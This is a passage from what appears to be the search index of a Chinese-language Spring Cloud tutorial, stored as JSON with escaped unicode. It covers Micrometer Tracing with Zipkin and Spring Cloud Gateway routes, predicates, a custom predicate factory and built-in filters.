\u4f7f\u7528\u4e0a\u65b9\u7684\u4f9d\u8d56\uff0c\u53ef\u4ee5\u67e5\u770b\u670d\u52a1\u95f4\u7684\u8c03\u7528\u94fe\u8def\uff0c\u62d3\u6251\u5173\u7cfb\u7b49\u7b49\u3002","title":"Micrometer \u76d1\u63a7"},{"location":"09/#spring-cloud-ch9-micrometer-tracing","text":"MicroMeter Tracing \u662f\u5ea6\u91cf\u76d1\u63a7\u6846\u67b6\uff0c\u5b83\u53ef\u4ee5\u7528\u4e8e\u76d1\u63a7\u5e94\u7528\u7684\u6027\u80fd\u6307\u6807\u3002\u5728 Spring Cloud \u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 MicroMeter Tracing \u6765\u76d1\u63a7\u670d\u52a1\u7684\u6027\u80fd\u6307\u6807\uff0c\u6bd4\u5982\u8bf7\u6c42\u7684\u54cd\u5e94\u65f6\u95f4\u3001\u8bf7\u6c42\u7684\u6210\u529f\u7387\u7b49\u3002\u5e76\u67e5\u770b\u6574\u4e2a\u5fae\u670d\u52a1\u7cfb\u7edf\u7684\u94fe\u8def\uff0c\u65b9\u4fbf\u6392\u67e5\u95ee\u9898\u3002 MicroMeter Tracing \u6536\u96c6\u7684\u6570\u636e\u53ef\u4ee5\u901a\u8fc7 ZipKin \u6765\u53ef\u89c6\u5316\u5c55\u793a\u3002","title":"Spring Cloud \u901f\u6210 Ch9 MicroMeter Tracing \u670d\u52a1\u94fe\u8def\u8ffd\u8e2a"},{"location":"09/#zipkin","text":"\u5411 compose \u6587\u4ef6\u6dfb\u52a0\uff0c zipkin: image: openzipkin/zipkin ports: - 9411:9411 \u53ea\u8f6c\u53d1 9411 \u7aef\u53e3\u5373\u53ef\uff0c\u7136\u540e\u542f\u52a8 docker\uff0c\u8bbf\u95ee 9411 \u7aef\u53e3\u5373\u53ef\u3002","title":"\u542f\u52a8 ZipKin"},{"location":"09/#micrometer-tracing","text":"\u6839\u636e \u5b98\u65b9\u6587\u6863 \uff0c\u9996\u5148\u8981\u5f15\u5165\u4f9d\u8d56\uff0c implementation platform('io.micrometer:micrometer-tracing-bom:latest.release') platform \u7684\u529f\u80fd\u548c dependencyManagement \u7c7b\u4f3c\uff0c\u53ef\u4ee5\u7edf\u4e00\u7ba1\u7406\u4f9d\u8d56\u7684\u7248\u672c\u3002 implementation 'io.micrometer:micrometer-tracing' \u6ce8\u610f\uff0cMicrometer \u672c\u8eab\u662f\u53ea\u662f\u4e00\u4e2a\u8ffd\u8e2a\u6846\u67b6\uff0c\u9700\u8981\u914d\u5408\u5177\u4f53\u7684\u5b9e\u73b0\u6765\u4f7f\u7528\uff0c\u6bd4\u5982 Brave\uff0c\u4f5c\u4e3a\u5206\u5e03\u5f0f\u8ffd\u8e2a\u7684\u5b9e\u73b0\uff0c\u4ee5\u53ca Observer\uff0c\u4f5c\u4e3a\u6027\u80fd\u76d1\u63a7\u7684\u5b9e\u73b0\u3002 implementation 'io.micrometer:micrometer-tracing-bridge-brave' implementation 'io.micrometer:micrometer-observation' \u7136\u540e\u9700\u8981\u4e00\u4e2a Reporter\uff0c\u628a\u6570\u636e\u53d1\u9001\u5230 ZipKin\uff0c implementation 'io.zipkin.reporter2:zipkin-reporter-brave' \u5982\u679c\u662f\u7528\u7684 Spring Interface Client\uff0c\u9ed8\u8ba4\u6709\u4e00\u4e2a WebClient \u7684\u8ffd\u8e2a\u5668\uff0c\u53c2\u89c1 \u6587\u6863 \u3002\u5982\u679c\u4f7f\u7528 OpenFeign\uff0c\u8fd8\u8981\u5f15\u5165 OpenFeign \u7684\u8ffd\u8e2a\u5668\uff0c implementation 'io.github.openfeign:feign-micrometer:13.3' \u8fd9\u4e9b\u5e94\u8be5\u5f15\u5165\u5230\u9700\u8981\u8ffd\u8e2a\u7684\u670d\u52a1\u4e2d\u3002\u8fd9\u91cc\u6211\u4eec\u5e0c\u671b\u8ffd\u8e2a\u6240\u6709\u670d\u52a1\uff0c\u6240\u4ee5\u5728 allprojects \u4e2d\u5f15\u5165\u3002 \u5982\u679c\u4f7f\u7528\u9ed8\u8ba4\u7684 WebClient Builder\uff0c\u5373\u4e0d\u81ea\u5b9a\u4e49 WebClient Builder\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u989d\u5916\u914d\u7f6e\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684 WebClient Builder \u5df2\u7ecf\u96c6\u6210\u4e86\u8ffd\u8e2a\u5668\u3002 \u4f46\u662f\uff0c\u56e0\u4e3a\u6211\u4eec\u4e4b\u524d\u66f4\u6539\u4e86 WebClient Builder\uff0c\u6240\u4ee5\u9700\u8981\u624b\u52a8\u6dfb\u52a0\u8ffd\u8e2a\u5668\uff0c\u53c2\u8003 \u6587\u6863 \u5982\u679c\u7528 OpenFeign\uff0c\u4e0d\u7528\u505a\u8fd9\u4e00\u6b65\u3002 @Bean @LoadBalanced WebClient.Builder webClientBuilder( @Autowired ObservationWebClientCustomizer observationWebClientCustomizer ) { HttpAsyncClientBuilder clientBuilder = HttpAsyncClients.custom(); clientBuilder.setDefaultRequestConfig(RequestConfig.custom().build()); CloseableHttpAsyncClient client = clientBuilder.build(); ClientHttpConnector connector = new HttpComponentsClientHttpConnector(client); WebClient.Builder builder = WebClient.builder(); observationWebClientCustomizer.customize(builder); return builder.clientConnector(connector); } \u7136\u540e\u4fee\u6539\u9700\u8981\u8ffd\u8e2a\u7684\u670d\u52a1\u7684\u914d\u7f6e\uff0c management: zipkin: tracing: endpoint: http://localhost:9411/api/v2/spans tracing: sampling: probability: 1.0 \u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u5728 ZipKin \u4e2d\u770b\u5230\u670d\u52a1\u7684\u94fe\u8def\u4e86\u3002\u542f\u52a8\u4e24\u4e2a\u670d\u52a1\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u5065\u5eb7\u68c0\u67e5\u7684\u4fe1\u606f\uff0c \u518d\u4efb\u610f\u53d1\u9001\u4e00\u4e2a\u8bf7\u6c42\uff0c\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u94fe\u8def\u4fe1\u606f\uff0c \u70b9\u51fb Show \u53ef\u4ee5\u770b\u5230\u8be6\u7ec6\u7684\u94fe\u8def\u4fe1\u606f\uff0c \u4f7f\u7528\u4e0a\u65b9\u7684\u4f9d\u8d56\uff0c\u53ef\u4ee5\u67e5\u770b\u670d\u52a1\u95f4\u7684\u8c03\u7528\u94fe\u8def\uff0c\u62d3\u6251\u5173\u7cfb\u7b49\u7b49\u3002","title":"\u914d\u7f6e MicroMeter Tracing"},{"location":"10/","text":"Spring Cloud \u901f\u6210 Ch10 GateWay \u7f51\u5173 Spring Cloud Gateway \u662f Spring Cloud \u7684\u4e00\u4e2a\u5168\u65b0\u9879\u76ee\uff0c\u5b83\u65e8\u5728\u4e3a\u5fae\u670d\u52a1\u67b6\u6784\u63d0\u4f9b\u4e00\u79cd\u7b80\u5355\u6709\u6548\u7684\u7edf\u4e00\u7684 API \u8def\u7531\u7ba1\u7406\u65b9\u5f0f\u3002 \u4e0d\u8fc7\u5728\u5b66\u4e60 Gateway \u524d\uff0c\u6211\u4eec\u5148\u6765\u590d\u4e60\u4e00\u4e0b\u8ba1\u7b97\u673a\u7f51\u7edc\u3002 \u7f51\u5173 \u8ba1\u7b97\u673a\u7f51\u7edc\u6709 OSI \u4e03\u5c42\u6a21\u578b\uff08\u7406\u8bba\u6a21\u578b\uff09\u548c TCP/IP \u56db\u5c42\u6a21\u578b\uff08\u5b9e\u9645\u6a21\u578b\uff09\u3002 OSI \u6a21\u578b\u5305\u62ec\uff08\u81ea\u4e0b\u800c\u4e0a\uff09\uff1a \u7269\u7406\u5c42\uff0c\u5373\u8ba1\u7b97\u673a\u7f51\u7edc\u4f9d\u8d56\u7684\u7269\u7406\u8bbe\u5907\uff0c\u5982\u7f51\u7ebf\u3001\u4ea4\u6362\u673a\u7b49\u3002 \u6570\u636e\u94fe\u8def\u5c42\uff0c\u5373\u8ba1\u7b97\u673a\u7f51\u7edc\u7269\u7406\u8bbe\u5907\u4e4b\u95f4\u8fde\u63a5\u53ca\u5176\u6570\u636e\u4f20\u8f93\u7684\u534f\u8bae\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u4ee5\u592a\u7f51\u534f\u8bae\uff0cMAC \u5730\u5740\uff0c\u4ea4\u6362\u673a\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u7f51\u7edc\u5c42\uff0c\u9700\u8981\u8003\u8651\u7269\u7406\u4e0a\u7684\u9650\u5236\uff0c\u57fa\u4e8e MAC \u5730\u5740\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u7f51\u7edc\u5c42\uff0c\u5373\u5728\u6570\u636e\u94fe\u8def\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u591a\u4e2a\u7f51\u7edc\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 IP \u5730\u5740\uff0c\u8def\u7531\u5668\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u6570\u636e\u94fe\u8def\u5c42\uff0c\u53ea\u8003\u8651\u903b\u8f91\u4e0a\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u57fa\u4e8e IP \u5730\u5740\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u4f20\u8f93\u5c42\uff0c\u5373\u5728\u7f51\u7edc\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u7aef\u5230\u7aef\u7684\u8fde\u63a5\u4e2d\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 TCP \u534f\u8bae\uff0cUDP \u534f\u8bae\u7b49\u3002\u8fd9\u4e00\u5c42\u76f8\u6bd4\u4e8e\u7f51\u7edc\u5c42\uff0c\u53ea\u8003\u8651\u7aef\u5230\u7aef\u7684\u8fde\u63a5\uff0c\u57fa\u4e8e\u7aef\u53e3\u53f7\u8fdb\u884c\u6570\u636e\u4f20\u8f93\u3002 \u4f1a\u8bdd\u5c42\uff0c\u5373\u5728\u4f20\u8f93\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u8fde\u63a5\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u4f1a\u8bdd\u63a7\u5236\uff0c\u4f1a\u8bdd\u540c\u6b65\u7b49\uff0c\u5e38\u7528\u7684\u6280\u672f\u6709 RPC\uff0cRestful \u7b49\u3002 \u8868\u793a\u5c42\uff0c\u5373\u5728\u4f1a\u8bdd\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709\u6570\u636e\u683c\u5f0f\u8f6c\u6362\uff0c\u6570\u636e\u52a0\u5bc6\u7b49\u3002 \u5e94\u7528\u5c42\uff0c\u5373\u5728\u8868\u793a\u5c42\u652f\u6301\u4e86\u6570\u636e\u4f20\u8f93\u7684\u57fa\u7840\u4e0a\uff0c\u5982\u4f55\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u4f20\u8f93\u6570\u636e\uff0c\u91cd\u8981\u7684\u6982\u5ff5\u6709 HTTP \u534f\u8bae\uff0cFTP \u534f\u8bae\uff0cDNS \u534f\u8bae\u7b49\u3002 TCP/IP \u6a21\u578b\u5305\u62ec\uff08\u81ea\u4e0b\u800c\u4e0a\uff09\uff1a \u7f51\u7edc\u63a5\u53e3\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7269\u7406\u5c42\u548c\u6570\u636e\u94fe\u8def\u5c42\u3002 \u7f51\u9645\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7f51\u7edc\u5c42\u3002 \u4f20\u8f93\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u4f20\u8f93\u5c42\u3002 \u5e94\u7528\u5c42\uff0c\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u4f1a\u8bdd\u5c42\u3001\u8868\u793a\u5c42\u548c\u5e94\u7528\u5c42\u3002 \u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u4e2d\uff0c\u7f51\u5173\u662f\u4e00\u4e2a\u7f51\u7edc\u8282\u70b9\uff0c\u7528\u4e8e\u8fde\u63a5\u4e24\u4e2a\u7f51\u7edc\uff0c\u5b9e\u73b0\u6570\u636e\u7684\u8f6c\u53d1\u3002\u7f51\u5173\u662f OSI \u6a21\u578b\u4e2d\u7684\u7b2c\u4e09\u5c42\u8bbe\u5907\uff0c\u5b83\u53ef\u4ee5\u5b9e\u73b0\u4e0d\u540c\u7f51\u7edc\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\uff0c\u662f\u7f51\u7edc\u5c42\u7684\u4e00\u4e2a\u8bbe\u5907\u3002 \u4f8b\u5982\uff0c\u6211\u4eec\u7684\u5bb6\u5ead\u7f51\u7edc\u8fde\u63a5\u4e86\u4e92\u8054\u7f51\uff0c\u90a3\u4e48\u5bb6\u5ead\u7f51\u7edc\u7684\u8def\u7531\u5668\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u7f51\u5173\uff0c\u5c06\u5bb6\u5ead\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u8fde\u63a5\u8d77\u6765\u3002\u5bf9\u4e8e\u516c\u53f8\u90e8\u7f72\u597d\u7684\u8f6f\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u7f51\u5173\u90e8\u7f72\u5728\u516c\u53f8\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u5b9e\u73b0\u516c\u53f8\u5185\u90e8\u7f51\u7edc\u548c\u4e92\u8054\u7f51\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u3002 Spring Gateway \u4e09\u5927\u6838\u5fc3\u6982\u5ff5 Spring Gateway \u6709\u4e09\u5927\u6838\u5fc3\u6982\u5ff5\uff1a \u65ad\u8a00\uff08Predicate\uff09\uff1a\u7528\u4e8e\u5339\u914d HTTP \u8bf7\u6c42\u7684\u5c5e\u6027\uff0c\u5982\u8bf7\u6c42\u8def\u5f84\u3001\u8bf7\u6c42\u53c2\u6570\u7b49\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u65ad\u8a00\u548c assert \u5b8c\u5168\u4e0d\u662f\u4e00\u4e2a\u610f\u601d\uff0c\u662f\u7ffb\u8bd1\u7684\u95ee\u9898\u3002Predicate \u6b63\u786e\u7684\u7ffb\u8bd1\u5e94\u8be5\u662f\u8c13\u8bcd\u6216\u8005\u5224\u5b9a\u5668\u3001\u5224\u636e\uff0c\u4e5f\u5c31\u662f\u4e00\u4e9b\u7528\u6765\u5224\u65ad\u67d0\u7269\u662f\u5426\u7b26\u5408\u67d0\u6761\u4ef6\u7684\u51fd\u6570\u3002 \u8fc7\u6ee4\u5668\uff08Filter\uff09\uff1a\u7528\u4e8e\u4fee\u6539 HTTP \u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u5c5e\u6027\uff0c\u5982\u8bf7\u6c42\u5934\u3001\u8bf7\u6c42\u4f53\u7b49\u3002\u53ef\u4ee5\u52a0\u5728\u65ad\u8a00\u4e4b\u524d\u6216\u4e4b\u540e\u3002 \u8def\u7531\uff08Route\uff09\uff1a\u7528\u4e8e\u5c06\u65ad\u8a00\u548c\u8fc7\u6ee4\u5668\u7ec4\u5408\u5728\u4e00\u8d77\uff0c\u5b9e\u73b0\u8bf7\u6c42\u7684\u8f6c\u53d1\u3002 \u5728\u63a5\u53d7\u5230\u8bf7\u6c42\u540e\uff0c\u9996\u5148\u68c0\u67e5\u8def\u7531\uff0c\u628a\u8bf7\u6c42\u53d1\u9001\u5230\u5bf9\u5e94\u7684\u8def\u7531\u4e0a\u3002\u7136\u540e\uff0c\u68c0\u67e5\u65ad\u8a00\uff0c\u5982\u679c\u65ad\u8a00\u5339\u914d\uff0c\u5219\u6267\u884c\u8fc7\u6ee4\u5668\uff0c\u4fee\u6539\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u6700\u540e\uff0c\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u76ee\u6807\u670d\u52a1\u3002 \u5982\u679c\u7528\u7c7b\u4f3c\u4ee3\u7801\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u4f2a\u4ee3\u7801\uff1a void gatewayHandleRequest(Request request) { for (Route route : routes) { boolean match = true; for (Predicate predicate : route.getPredicates()) { match &= predicate.test(request); } if (!match) continue; for (Filter filter : route.getFilters()) { filter.filter(request); } route.forward(request); return; } } \u521b\u5efa Gateway Gateway \u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u8981\u6ce8\u518c\u5230\u6ce8\u518c\u4e2d\u5fc3\u4e2d\u3002 \u56e0\u6b64\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Spring \u5b50\u9879\u76ee\uff0c\u8981\u5305\u62ec\u4e4b\u524d Consul \u7684\u4f9d\u8d56\uff0c\u4ee5\u53ca Gateway \u7684\u4f9d\u8d56\u3002 dependencies { implementation 'org.springframework.boot:spring-boot-starter-actuator' implementation 'org.springframework.cloud:spring-cloud-starter-consul-discovery' implementation 'org.springframework.cloud:spring-cloud-starter-bootstrap' implementation 'org.springframework.cloud:spring-cloud-starter-consul-config' implementation 'org.springframework.cloud:spring-cloud-starter-gateway:4.1.5' } \u56e0\u4e3a\u4f7f\u7528\u7684 spring boot \u7248\u672c\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u9879\u76ee\u5373\u53ef\u5728 Consul \u6ce8\u518c\u7f51\u5173\u3002 \u6211\u4eec\u628a\u7f51\u5173\u6539\u5230 9527 \u7aef\u53e3\u3002 \u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u8def\u7531\u6620\u5c04 \u5bf9\u4e8e\u7b80\u5355\u7684\u8def\u7531\u6620\u5c04\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u914d\u7f6e\u6587\u4ef6\u6765\u5b9e\u73b0\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** \u8fd9\u91cc\u7684 uri \u53ef\u4ee5\u76f4\u63a5\u5199 http \u5730\u5740\u3002\u4f46\u662f\u5982\u679c\u5199 lb:// \uff0c\u5219\u8868\u793a load balanced\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u540d\u6765\u8bbf\u95ee\u670d\u52a1\u3002 id \u662f\u4efb\u610f\u7684\uff0c\u4f46\u662f\u8981\u552f\u4e00\u3002\u8fd9\u91cc\u7684 predicates \u662f\u8def\u7531\u8f6c\u53d1\u7684\u6761\u4ef6\uff0c\u8fd9\u91cc\u8868\u793a\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u8f6c\u53d1\u5230 payment-service \u670d\u52a1\u3002 \u8fd9\u6837\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u7f51\u5173\u8bbf\u95ee payment \u670d\u52a1\u4e86\uff0c\u4f8b\u5982 localhost:9527/payment \u3002 \u5982\u679c\u9700\u8981\u8ba9\u5176\u5b83\u7684\u670d\u52a1\u4e5f\u8fc7\u7f51\u5173\uff0c\u4fee\u6539\u5b83\u4eec\u8c03\u7528\u7684 URI \u5373\u53ef\uff0c\u5373\u4e0b\u9762\u8fd9\u6837 // @HttpExchange(\"http://payment-service/payment\") @HttpExchange(\"http://gateway-service/payment\") \u6211\u4eec\u53ef\u4ee5\u5728 ZipKin \u4e2d\u770b\u5230\uff0c\u73b0\u5728 order \u8bf7\u6c42\u5148\u7ecf\u8fc7\u4e86\u7f51\u5173\uff0c\u7f51\u5173\u518d\u8f6c\u53d1\u5230 payment \u670d\u52a1\u3002 \u57fa\u4e8e Bean \u8fdb\u884c\u8def\u7531\u6620\u5c04 \u9664\u4e86\u914d\u7f6e\u6587\u4ef6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\u8def\u7531\u3002 @Configuration public class GatewayConfig { @Bean public RouteLocator customRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(\"payment-service\", r -> r.path(\"/payment/**\") .uri(\"lb://payment-service\")) .build(); } } Predicate Predicate \u662f\u7528\u6765\u5339\u914d\u8bf7\u6c42\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u6839\u636e\u8bf7\u6c42\u7684\u8def\u5f84\u3001\u8bf7\u6c42\u7684\u53c2\u6570\u7b49\u6765\u5339\u914d\u3002\u4e4b\u524d\u6211\u4eec\u53ea\u7528\u4e86 Path \u65ad\u8a00\uff0c\u8fd8\u6709\u5f88\u591a\u5176\u5b83\u7684\u65ad\u8a00\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \uff0c\u5176\u5b83 Predicate \u7684\u5199\u6cd5\u90fd\u8981\u53c2\u8003\u6587\u6863\u3002 \u5185\u5efa\u7684 Predicate \u6709\uff1a After\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u67d0\u4e2a\u65f6\u95f4\u4e4b\u540e Before\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u67d0\u4e2a\u65f6\u95f4\u4e4b\u524d Between\uff0c\u8bf7\u6c42\u65f6\u95f4\u5728\u4e24\u4e2a\u65f6\u95f4\u4e4b\u95f4 Cookie\uff0c\u8bf7\u6c42\u4e2d\u5305\u542b\u67d0\u4e2a Cookie Header\uff0c\u8bf7\u6c42\u5934\u4e2d\u5305\u542b\u67d0\u4e2a\u503c Host\uff0c\u8bf7\u6c42\u7684 Host \u5339\u914d Method\uff0c\u8bf7\u6c42\u7684\u65b9\u6cd5\u5339\u914d Path\uff0c\u8bf7\u6c42\u7684\u8def\u5f84\u5339\u914d Query\uff0c\u8bf7\u6c42\u7684\u53c2\u6570\u5339\u914d RemoteAddr\uff0c\u8bf7\u6c42\u7684 IP \u5730\u5740\u5339\u914d Predicate \u914d\u7f6e\u65b9\u5f0f\u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u53eb Shortcut\uff0c\u5373\u7b80\u5316\u7684\u914d\u7f6e\u65b9\u5f0f\uff0c\u53e6\u4e00\u79cd\u53eb Full Expanded\uff0c\u5373\u5b8c\u5168\u5c55\u5f00\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 \u8fd9\u79cd\u914d\u7f6e\u65b9\u5f0f\u662f Shortcut\uff0c\u5373\u7b80\u5316\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Path=/** - Query=** \u8fd9\u79cd\u914d\u7f6e\u65b9\u5f0f\u662f Full Expanded\uff0c\u5373\u5b8c\u5168\u5c55\u5f00\u7684\u914d\u7f6e\u65b9\u5f0f\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Path args: pattern: /** \u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 Bean \u6765\u914d\u7f6e\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002 \u81ea\u5b9a\u4e49 Predicate \u6240\u6709\u7684 Predicate \u90fd\u9700\u8981\u4e00\u4e2a RoutePredicateFactory \u5de5\u5382\u6765\u4ea7\u751f\u3002\u9700\u8981\u81ea\u5b9a\u4e49 Predicate \u65f6\uff0c\u9700\u8981\u7ee7\u627f AbstractRoutePredicateFactory \u7c7b\u3002 \u6ce8\u610f\uff0c\u7c7b\u540d\u5e94\u5f53\u4ee5 RoutePredicateFactory \u7ed3\u5c3e\uff0c\u56e0\u4e3a Gateway \u4f1a\u81ea\u52a8\u626b\u63cf\u8fd9\u4e9b\u7c7b\u3002 @Validated \u6ce8\u89e3\u662f Spring \u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u6821\u9a8c\u914d\u7f6e\u662f\u5426\u6b63\u786e\u3002ServerWebExchange \u7c7b\u4f3c\u4e8e HttpServletRequest\uff0c\u7528\u4e8e\u83b7\u53d6\u8bf7\u6c42\u7684\u4fe1\u606f\u3002 @Component public class CustomPredicateFactory extends AbstractRoutePredicateFactory<CustomPredicateFactory.Config> { @Validated public class CustomConfig { // configurations needed for this predicate @Data String secret; } public CustomPredicateFactory() { super(Config.class); } @Override public List<String> shortcutFieldOrder() { // return the order of the arguments return Arrays.asList(\"secret\"); } @Override public Predicate<ServerWebExchange> apply(Config config) { // return a Predicate return new Predicate<ServerWebExchange>() { @Override public boolean test(ServerWebExchange exchange) { // test the exchange String secret = exchange.getRequest().getQueryParams().getFirst(\"secret\"); return secret != null && secret.equals(config.secret); } }; } } \u6dfb\u52a0\u4e4b\u540e\uff0c\u5728 yml \u6587\u4ef6\u4e2d\u4f7f\u7528\u65f6\uff0cFull Expanded \u7684\u65b9\u5f0f\u5982\u4e0b\uff1a spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - name: Custom args: secret: 123 \u800c Shortcut \u7684\u65b9\u5f0f\u5982\u4e0b\uff0c\u5176\u4e2d\u53c2\u6570\u7528\u9017\u53f7\u5206\u9694\uff0c\u987a\u5e8f\u4e0e\u4e0a\u9762\u7684 ShortcutFieldOrder \u8fd4\u56de\u503c\u4e00\u81f4\u3002 spring: cloud: gateway: routes: - id: payment-service uri: lb://payment-service predicates: - Custom=123 Predicate \u7684\u540d\u5b57 Custom\uff0c\u8fd9\u662f\u7c7b\u540d\u7684\u53bb\u6389 PredicateFactory \u540e\u7684\u90e8\u5206\u3002 Filter Spring Gateway \u4e2d Filter \u6709\u4e24\u79cd\uff0c\u4e00\u79cd\u662f Global Filter\uff0c\u4e00\u79cd\u662f Gateway Filter\u3002\u524d\u8005\u4f5c\u7528\u4e8e\u6240\u6709\u7684\u8def\u7531\uff0c\u540e\u8005\u4f5c\u7528\u4e8e\u5355\u4e2a\u8def\u7531\u3002\u4f46\u662f\uff0c\u524d\u8005\u6211\u4eec\u4e00\u822c\u4e0d\u9700\u8981\u53bb\u52a8\u5b83\u4eec\u7684\u9ed8\u8ba4\u914d\u7f6e\u3002 Gateway Filter \u7528\u4e8e\u4fee\u6539\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u4f8b\u5982\u6dfb\u52a0\u8bf7\u6c42\u5934\u3001\u4fee\u6539\u8bf7\u6c42\u4f53\u7b49\u3002\u5168\u90e8\u5199\u6cd5\u5177\u4f53\u6709\u5f88\u591a\uff0c\u5177\u4f53\u53ef\u53c2\u8003 \u5b98\u65b9\u6587\u6863 \u3002 \u5185\u5efa\u7684 Filter \u6709\uff1a \u8bf7\u6c42\u5934\u76f8\u5173 AddRequestHeader\uff0c\u6dfb\u52a0\u8bf7\u6c42\u5934 AddRequestHeaderIfNotPresent\uff0c\u5982\u679c\u8bf7\u6c42\u5934\u4e0d\u5b58\u5728\uff0c\u5219\u6dfb\u52a0\u8bf7\u6c42\u5934 SetRequestHeader\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u5934 SetRequestHostHeader\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u7684 Host \u5934 RemoveRequestHeader\uff0c\u79fb\u9664\u8bf7\u6c42\u5934 MapRequestHeader\uff0c\u6620\u5c04\u8bf7\u6c42\u5934 RequestHeaderSize\uff0c\u9650\u5236\u8bf7\u6c42\u5934\u7684\u5927\u5c0f \u54cd\u5e94\u5934\u76f8\u5173 AddResponseHeader\uff0c\u6dfb\u52a0\u54cd\u5e94\u5934 SetResponseHeader\uff0c\u8bbe\u7f6e\u54cd\u5e94\u5934 FallbackHeaders\uff0c\u670d\u52a1\u964d\u7ea7\u65f6\u8bbe\u7f6e\u54cd\u5e94\u5934 RemoveResponseHeader\uff0c\u79fb\u9664\u54cd\u5e94\u5934 DedupeResponseHeader\uff0c\u5220\u9664\u54cd\u5e94\u5934\u4e2d\u7684\u91cd\u590d\u6761\u76ee RewriteLocationResponseHeader\uff0c\u91cd\u5199 Location \u54cd\u5e94\u5934\u4e2d\u7684 URL RewriteResponseHeader\uff0c\u91cd\u5199\u54cd\u5e94\u5934\u4e2d\u7684\u7279\u5b9a\u503c SecureHeaders\uff0c\u6dfb\u52a0\u5e38\u89c1\u7684\u5b89\u5168\u76f8\u5173 HTTP \u5934 RewriteLocationResponseHeader\uff0c\u91cd\u5199 Location \u54cd\u5e94\u5934\u4e2d\u7684 URL \u8def\u5f84\u548c\u53c2\u6570\u76f8\u5173 RewritePath\uff0c\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u548c\u91cd\u5199\u8bf7\u6c42\u8def\u5f84 SetPath\uff0c\u8bbe\u7f6e\u8bf7\u6c42\u8def\u5f84 StripPrefix\uff0c\u53bb\u9664\u8bf7\u6c42\u8def\u5f84\u4e2d\u7684\u6307\u5b9a\u524d\u7f00 